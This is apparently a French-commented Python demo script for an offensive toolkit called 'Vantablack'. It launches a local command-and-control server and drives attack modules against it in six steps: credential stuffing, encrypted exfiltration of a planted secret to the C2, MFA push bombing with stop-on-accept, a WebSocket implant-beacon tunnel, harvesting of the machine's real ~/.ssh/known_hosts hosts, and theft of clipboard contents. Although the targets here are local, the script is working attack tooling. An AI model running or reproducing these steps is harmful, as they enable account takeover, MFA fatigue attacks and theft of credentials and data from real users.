#!/usr/bin/env python3
"""
demo_real_live.py — DÉMO LIVE du MODE RÉEL Vantablack (0 mock, 0 simulation)
=============================================================================

Une seule commande, 6 étapes 100% réelles exécutées sous vos yeux :

  1. C2 de labo RÉEL         → démarrage réel + health check
  2. Credential Stuffing RÉEL→ POST httpx réels, verdict HTTP par identifiant
  3. Exfiltration RÉELLE     → AES-256-GCM → POST → déchiffrement, SHA-256 croisé
  4. MFA Bombing RÉEL        → pushes réels, allow serveur, stop-on-accept
  5. Tunnel WebSocket RÉEL   → connect → send → écho identique → close
  6. Harvest FS RÉEL         → hôtes SSH réellement contactés (known_hosts)

Pré-checks en ouverture (python, dépendances, port, C2) pour qu'une démo
ne puisse jamais flopper sur un détail d'environnement. Exit code 0 si et
seulement si les 6 étapes passent.

Usage :  .venv/bin/python demo_real_live.py
         (ou : make demo-real)
"""

from __future__ import annotations

import hashlib
import json
import os
import shutil
import socket
import subprocess
import sys
import time
import urllib.request
from pathlib import Path

GREEN, RED, YELLOW, CYAN, BOLD, NC = (
    "\033[0;32m", "\033[0;31m", "\033[0;33m",
    "\033[0;36m", "\033[1m", "\033[0m",
)
DEMO_DIR = Path("captures/demo_live")
LABC2_USERS = "alice@corp.local,bob@corp.local"
LABC2_LOCKED = "locked@corp.local"


def ok(msg: str) -> None:
    print(f"  {GREEN}✓{NC} {msg}")


def fail(msg: str) -> None:
    print(f"  {RED}✗ ÉCHEC : {msg}{NC}")


def info(msg: str) -> None:
    print(f"  {CYAN}→{NC} {msg}")


def banner(n: int, title: str) -> None:
    print(f"\n{BOLD}{CYAN}[ÉTAPE {n}/6] {title}{NC}")


def free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return int(s.getsockname()[1])


def wait_tcp(port: int, timeout_s: float = 8.0) -> bool:
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.5):
                return True
        except OSError:
            time.sleep(0.1)
    return False


# ---------------------------------------------------------------------------
# Pré-checks : rien ne peut flopper sur l'environnement
# ---------------------------------------------------------------------------

def precheck() -> None:
    print(f"{BOLD}PRÉ-CHECKS (environnement de démo){NC}")
    py = f"{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}"
    ok(f"Python {py}")
    missing = []
    for mod in ("httpx", "websockets", "cryptography", "pynput", "pyperclip"):
        try:
            __import__(mod)
            ok(f"dépendance {mod}")
        except ImportError:
            missing.append(mod)
            fail(f"dépendance {mod} absente")
    if missing:
        raise SystemExit(
            f"{RED}Installer : .venv/bin/pip install {' '.join(missing)}{NC}")
    if not Path("c2/lab_c2_server.py").is_file():
        raise SystemExit(f"{RED}Lancer depuis la racine du repo Vantablack{NC}")
    DEMO_DIR.mkdir(parents=True, exist_ok=True)
    ok(f"répertoire artefacts : {DEMO_DIR}/")


# ---------------------------------------------------------------------------
# Étape 1 — C2 de labo réel
# ---------------------------------------------------------------------------

class LabC2:
    def __init__(self) -> None:
        self.port = free_port()
        env = dict(os.environ,
                   PATH="/usr/bin:/bin",
                   LABC2_PORT=str(self.port),
                   LABC2_ACCEPT_USERS=LABC2_USERS,
                   LABC2_LOCK_USERS=LABC2_LOCKED,
                   LABC2_ACCEPT_AFTER_N="3")
        self.proc = subprocess.Popen(
            [sys.executable, "c2/lab_c2_server.py", str(self.port)],
            env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.base = f"http://127.0.0.1:{self.port}"
        # Instantané du journal AVANT la démo (pour compter les requêtes
        # de CETTE session uniquement — preuve non cumulée)
        journal = Path("captures/lab_c2/stuffing.jsonl")
        self.stuffing_lines_before = (
            len(journal.read_text().splitlines()) if journal.is_file() else 0)

    def health(self) -> dict:
        with urllib.request.urlopen(f"{self.base}/health", timeout=3) as r:
            return json.loads(r.read())

    def stop(self) -> None:
        self.proc.terminate()
        try:
            self.proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            self.proc.kill()


# ---------------------------------------------------------------------------
# Étapes 2 → 6
# ---------------------------------------------------------------------------

def step_stuffing(c2: LabC2) -> bool:
    from attack.credential_stuffing.sprayer import (CredentialPair,
                                                    CredentialStuffingEngine,
                                                    RealLoginTarget)
    target = RealLoginTarget(url=f"{c2.base}/ingest", method="json",
                             user_field="user", password_field="password")
    creds = [
        ("alice@corp.local", "Spring2026!", 200, "HIT — mot de passe valide"),
        ("bob@corp.local", "Winter2025!", 200, "HIT — mot de passe valide"),
        ("mallory@corp.local", "WrongPass1!", 401, "refusé"),
        ("locked@corp.local", "Whatever1!", 423, "compte VERROUILLÉ"),
    ]
    for user, pwd, expect, label in creds:
        eng = CredentialStuffingEngine(
            real=True, real_login_target=target, proxy_pool=None,
            output_dir=str(DEMO_DIR / "stuffing"))
        rep = eng.run_credential_stuffing(
            [CredentialPair(username=user, password=pwd)], simulated=True)
        code = 200 if rep.successful_logins else (
            423 if rep.locked_accounts else 401)
        if code == expect:
            ok(f"POST réel {user:22} → HTTP {code} ({label})")
        else:
            fail(f"{user} : attendu HTTP {expect}, obtenu {code}")
            return False
    log = Path("captures/lab_c2/stuffing.jsonl")
    lines = log.read_text().splitlines() if log.is_file() else []
    delta = len(lines) - c2.stuffing_lines_before
    ok(f"preuve côté serveur : {delta} requêtes reçues PENDANT cette démo "
       f"(journal complet : captures/lab_c2/stuffing.jsonl)")
    return delta >= 4


def step_exfil(c2: LabC2) -> bool:
    from attack.post_exploitation.exfil import (DataExfiltrator, StagedFile,
                                                decrypt_exfil_blob)
    secret = (f"SECRET DÉMO LIVE #{time.time():.0f} — IBAN FR76 3000 6000 "
              f"0112 3456 7890 189 / mdp: S3cr3t!Démo-2026").encode()
    src = DEMO_DIR / "secret.txt"
    src.write_bytes(secret)
    info(f"secret de {len(secret)} octets écrit")
    ex = DataExfiltrator(destination=f"{c2.base}/exfil",
                         output_path=str(DEMO_DIR / "demo.bin.enc"))
    ex.exfil_files([StagedFile(path=str(src), category="Lab",
                               sensitivity_score=0.99)])
    ok("chiffré AES-256-GCM (clé de session 256 bits, nonce 96 bits)")
    n = ex.send_real()
    if n != 1:
        fail(f"POST réel : {n} blob envoyé au lieu de 1")
        return False
    ok(f"POST HTTP réel → {c2.base}/exfil (réception confirmée)")
    recv = Path(f"captures/lab_c2/exfil_{ex.session_id}.jsonl")
    if not recv.is_file():
        fail("le C2 n'a rien reçu")
        return False
    entry = json.loads(recv.read_text().splitlines()[-1])
    clear = decrypt_exfil_blob(ex.session_key_b64,
                               entry["nonce_b64"], entry["ct_b64"])
    sha_tx = hashlib.sha256(secret).hexdigest()[:16]
    sha_rx = hashlib.sha256(clear).hexdigest()[:16]
    ok(f"SHA-256 émetteur {sha_tx}… == récepteur {sha_rx}…")
    if clear != secret:
        fail("déchiffrement différent de l'original")
        return False
    ok("déchiffrement côté C2 : octets identiques à l'original")
    return True


def step_mfa(c2: LabC2) -> bool:
    from attack.mfa_bombing.bomber import MFABombingEngine, MFATarget
    eng = MFABombingEngine(output_dir=str(DEMO_DIR / "mfa"))
    camp = eng.start_campaign(
        target=MFATarget.MICROSOFT_ENTRA, username="victim@corp.local",
        interval_seconds=0.05, max_attempts=25,
        push_url=f"{c2.base}/push", real=True)
    t0 = time.time()
    while camp.accepted_attempt is None and time.time() - t0 < 20:
        time.sleep(0.05)
    camp.stop_event.set()
    time.sleep(0.3)
    a = camp.accepted_attempt
    if a is None:
        fail("aucun push accepté en 20s")
        return False
    for i in range(1, a.push_n):
        ok(f"push #{i} réel → décision serveur : deny")
    ok(f"push #{a.push_n} réel → décision serveur : {GREEN}ALLOW{NC} "
       f"(HTTP {a.response_code})")
    total = camp.stats()["total_attempts"]
    if total != a.push_n:
        fail(f"stop-on-accept défaillant : {total} pushes au lieu de {a.push_n}")
        return False
    ok(f"stop-on-accept OPSEC vérifié : {total} pushes au total, "
       f"campagne arrêtée net après acceptation")
    return True


def step_ws() -> bool:
    import asyncio
    from attack.ws_smuggling.smuggler import WSSmugglingTunnel
    port = free_port()
    code = (f"import asyncio, websockets\n"
            f"async def h(ws):\n    async for m in ws:\n        await ws.send(m)\n"
            f"async def main():\n"
            f"    async with websockets.serve(h, '127.0.0.1', {port}):\n"
            f"        await asyncio.Future()\nasyncio.run(main())")
    echo = subprocess.Popen([sys.executable, "-c", code],
                            env={"PATH": "/usr/bin:/bin"},
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        if not wait_tcp(port):
            fail("serveur echo WS jamais prêt")
            return False
        tun = WSSmugglingTunnel()
        cfg = tun.create_tunnel(ws_url=f"ws://127.0.0.1:{port}/ws")
        payload = b"IMPLANT>> beacon live demo, creds en piece jointe"
        res = asyncio.run(tun.roundtrip_real(cfg.tunnel_id, payload, timeout_s=5))
        if not res.get("sent") or res.get("data") != payload:
            fail(f"roundtrip WS invalide : {res}")
            return False
        ok(f"handshake WS réel sur ws://127.0.0.1:{port}/ws")
        ok(f"{res['size']} octets envoyés sur la vraie socket")
        ok("écho reçu strictement identique (comparaison octets)")
        ok("tunnel fermé proprement, journal in/out : captures/ws_tunnels/")
        return True
    finally:
        echo.terminate()


def step_harvest() -> bool:
    from attack.token_harvester.harvester import TokenHarvester, TokenSource
    sources = TokenHarvester.enumerate_real_sources()
    ok(f"sources réelles détectées sur cette machine : "
       f"{[s['name'] for s in sources] or 'aucune'}")
    h = TokenHarvester(output_dir=str(DEMO_DIR / "tokens"), mode="real")
    toks = h.harvest_from_source(TokenSource.SSH_KEYS, hostname="demo-live")
    hosts: set[str] = set()
    for t in toks:
        for host in t.raw_metadata.get("hosts", {}):
            hosts.add(host)
    if hosts:
        ok(f"lecture réelle de ~/.ssh/known_hosts : "
           f"{len(hosts)} hôtes contactés → {', '.join(sorted(hosts))}")
        for t in toks:
            h.exfiltrate(t)
        ok(f"exfiltrés vers {DEMO_DIR}/tokens/tokens.jsonl")
    else:
        info("aucun hôte SSH connu sur cette machine (résultat honnête : 0)")
    # Presse-papier RÉEL : on y écrit une valeur, puis on la vole pour de vrai
    import pyperclip
    from attack.post_exploitation.exfil import ClipboardStealer
    canary = f"Access-Key démo-live-{time.time():.0f} / mdp: S3cr3t!Live2026"
    pyperclip.copy(canary)
    snap = ClipboardStealer(output_dir=str(DEMO_DIR / "clipboard")).capture_real()
    if snap.content_length != len(canary):
        fail(f"presse-papier : lu {snap.content_length} car. au lieu de "
             f"{len(canary)}")
        return False
    ok(f"presse-papier RÉEL volé : {snap.content_length} caractères lus")
    types = sorted({p['type'] for p in snap.detected_patterns})
    ok(f"patterns détectés automatiquement : {types or 'aucun'}")
    return True


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> int:
    print(f"{BOLD}{'=' * 74}{NC}")
    print(f"{BOLD}  VANTABLACK — DÉMO LIVE MODE RÉEL  (0 mock · 0 simulation){NC}")
    print(f"{BOLD}{'=' * 74}{NC}")
    precheck()
    c2 = None
    results: list[tuple[str, bool]] = []
    try:
        banner(1, "C2 DE LABO RÉEL — démarrage")
        c2 = LabC2()
        if not wait_tcp(c2.port):
            fail("C2 jamais prêt")
            return 1
        hp = c2.health()
        ok(f"C2 réel écoutant sur 127.0.0.1:{c2.port} (PID {c2.proc.pid})")
        ok(f"health : accept={hp['accept_users']} "
           f"lock={hp['lock_users']} allow_dès_le_push_n°{hp['accept_after_n']}")
        results.append(("C2 de labo", True))

        banner(2, "CREDENTIAL STUFFING RÉEL — POST httpx vers le C2")
        results.append(("Stuffing", step_stuffing(c2)))

        banner(3, "EXFILTRATION RÉELLE — AES-256-GCM → POST → déchiffrement")
        results.append(("Exfiltration", step_exfil(c2)))

        banner(4, "MFA BOMBING RÉEL — pushes HTTP, décision serveur")
        results.append(("MFA Bombing", step_mfa(c2)))

        banner(5, "TUNNEL WEBSOCKET RÉEL — connect → send → écho → close")
        results.append(("Tunnel WS", step_ws()))

        banner(6, "POST-EX LOCALE RÉELLE — SSH known_hosts + presse-papier")
        results.append(("Harvest FS", step_harvest()))

        if c2 is not None:
            hp = c2.health()
            info(f"compteurs côté serveur C2 : {hp['counters']}")
    finally:
        if c2 is not None:
            c2.stop()
            info("C2 arrêté proprement")

    print(f"\n{BOLD}{'=' * 74}{NC}")
    print(f"{BOLD}  RÉCAP — MODE RÉEL{NC}")
    print(f"{BOLD}{'=' * 74}{NC}")
    all_ok = True
    for name, passed in results:
        all_ok &= passed
        mark = f"{GREEN}RÉUSSI{NC}" if passed else f"{RED}ÉCHEC{NC}"
        print(f"  {mark:20} {name}")
    print()
    if all_ok:
        print(f"{GREEN}{BOLD}  ✅ DÉMO {len(results)}/{len(results)} RÉUSSIE — tout est réel, "
              f"rien n'est simulé."
              f" Preuves : captures/demo_live/ + captures/lab_c2/{NC}\n")
        return 0
    print(f"{RED}{BOLD}  ❌ DÉMO ÉCHOUÉE — voir ✗ ci-dessus{NC}\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
